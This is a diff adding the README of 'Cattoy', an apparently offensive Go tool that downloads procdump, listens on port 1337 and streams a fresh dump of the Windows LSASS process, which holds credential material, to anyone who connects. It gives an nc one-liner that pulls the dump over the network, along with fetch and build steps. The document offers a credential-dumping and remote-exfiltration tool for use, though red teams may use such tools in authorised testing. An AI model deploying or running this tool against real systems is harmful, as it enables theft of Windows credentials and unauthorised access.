@@ -1,0 +1,18 @@
+Cattoy: A LSASS dumper on a stick
+
+Cattoy does the following:
+1. Download procdump from sysinternals.
+2. Starts a network listener on port 1337.
+3. Creates a new dump on incoming connection.
+4. Writes the dump out to the connection.
+
+Example:
+Once you have Cattoy running, you can run something like:
+	; nc $IP 1337 > lsass.dmp
+to get a fresh dump from the server
+
+Getting the source:
+	go get github.com/majiru/cattoy
+
+Building:
+	cd $GOPATH/src/github.com/majiru/cattoy && go build #Make sure to define GOOS if cross compiling
